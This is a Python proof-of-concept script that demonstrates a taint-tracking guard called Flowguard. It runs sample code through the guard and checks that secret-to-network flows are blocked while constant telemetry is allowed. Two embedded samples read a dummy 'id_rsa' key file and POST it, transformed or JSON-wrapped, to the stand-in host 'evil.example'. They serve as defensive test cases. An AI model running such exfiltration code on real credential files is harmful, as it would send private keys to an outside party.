from __future__ import annotations

import argparse
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, TextIO
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime


TRANSFORMED_SECRET_LEAK = """
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = secret.replace("PRIVATE", "PUBLIC").lower().encode("utf-8")
req = urllib.request.Request(url, data=payload, method="POST")
urllib.request.urlopen(req)
"""

SAFE_TELEMETRY = """
import urllib.request

with open(secret_path) as handle:
    _secret = handle.read()

req = urllib.request.Request(url, data=b"ok", method="POST")
urllib.request.urlopen(req)
"""

PRECISION_LOSS_LEAK = """
import json
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = json.dumps({"key": secret})
req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST")
urllib.request.urlopen(req)
"""


@dataclass(frozen=True, slots=True)
class PocArtifacts:
    report_path: Path
    events_path: Path


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)
    run_poc(out_dir=args.out_dir, name=args.name, output=sys.stdout)
    return 0


def run_poc(
    *,
    out_dir: Path,
    name: str,
    output: TextIO,
) -> PocArtifacts:
    out_dir.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmpdir:
        secret_path = Path(tmpdir) / "id_rsa"
        secret_path.write_text("PRIVATE KEY", encoding="utf-8")
        runtime = FlowguardRuntime(
            secret_paths=[secret_path],
            precision_mode="strict",
        )

        _print(output, "Flowguard Python MVP PoC")
        _run_blocked_case(
            runtime,
            secret_path=secret_path,
            code=TRANSFORMED_SECRET_LEAK,
            url="https://evil.example/upload",
            step="[1/3] transformed secret exfiltration",
            expected_policy="SecretToNetwork",
            output=output,
        )
        _run_allowed_case(runtime, secret_path=secret_path, output=output)
        _run_blocked_case(
            runtime,
            secret_path=secret_path,
            code=PRECISION_LOSS_LEAK,
            url="https://evil.example/precision-loss",
            step="[3/3] precision-loss strict mode",
            expected_policy="TaintPrecisionLostToNetwork",
            output=output,
        )

        artifacts = _write_artifacts(runtime, out_dir=out_dir, name=name)
        report = runtime.report()
        _print(output, "")
        _print(output, "reports:")
        _print(output, f"  {artifacts.report_path}")
        _print(output, f"  {artifacts.events_path}")
        _print(output, "summary:")
        _print(output, f"  violations={report.summary.violation_count}")
        _print(output, f"  allowed_sends={report.summary.allowed_send_count}")
        _print(output, f"  precision_losses={report.summary.precision_loss_count}")
        return artifacts


def _run_blocked_case(
    runtime: FlowguardRuntime,
    *,
    secret_path: Path,
    code: str,
    url: str,
    step: str,
    expected_policy: str,
    output: TextIO,
) -> None:
    _print(output, "")
    _print(output, step)
    try:
        runtime.run_python(
            code,
            inputs={
                "secret_path": str(secret_path),
                "url": url,
            },
        )
    except FlowguardBlocked as err:
        if err.policy != expected_policy:
            raise AssertionError(
                f"expected {expected_policy}, got {err.policy}"
            ) from err
        _print(output, f"result: BLOCKED {err.policy}")
        _print(output, err.explanation)
        return

    raise AssertionError(f"expected generated code to be blocked by {expected_policy}")


def _run_allowed_case(
    runtime: FlowguardRuntime,
    *,
    secret_path: Path,
    output: TextIO,
) -> None:
    _print(output, "")
    _print(output, "[2/3] safe telemetry")
    calls: list[dict[str, Any]] = []
    original_urlopen = request.urlopen

    def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
        calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
        return b"ok"

    request.urlopen = fake_urlopen
    try:
        runtime.run_python(
            SAFE_TELEMETRY,
            inputs={
                "secret_path": str(secret_path),
                "url": "https://telemetry.example/event",
            },
        )
    except FlowguardBlocked as err:
        raise AssertionError("expected constant telemetry to be allowed") from err
    finally:
        request.urlopen = original_urlopen

    if len(calls) != 1:
        raise AssertionError(f"expected one telemetry send, got {len(calls)}")
    _print(output, "result: ALLOWED")
    _print(output, f"allowed_requests={len(calls)}")


def _write_artifacts(
    runtime: FlowguardRuntime,
    *,
    out_dir: Path,
    name: str,
) -> PocArtifacts:
    report = runtime.report()
    report_path = out_dir / f"{name}.report.json"
    events_path = out_dir / f"{name}.events.jsonl"
    report.write_json(report_path)
    report.write_jsonl(events_path)
    return PocArtifacts(report_path=report_path, events_path=events_path)


def _parse_args(argv: list[str] | None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the Flowguard Python MVP PoC.")
    parser.add_argument(
        "--out-dir",
        type=Path,
        default=Path("logs"),
        help="Directory where report artifacts are written.",
    )
    parser.add_argument(
        "--name",
        default="python-mvp-poc",
        help="Base artifact name.",
    )
    return parser.parse_args(argv)


def _print(output: TextIO, text: str) -> None:
    print(text, file=output)


if __name__ == "__main__":
    raise SystemExit(main())
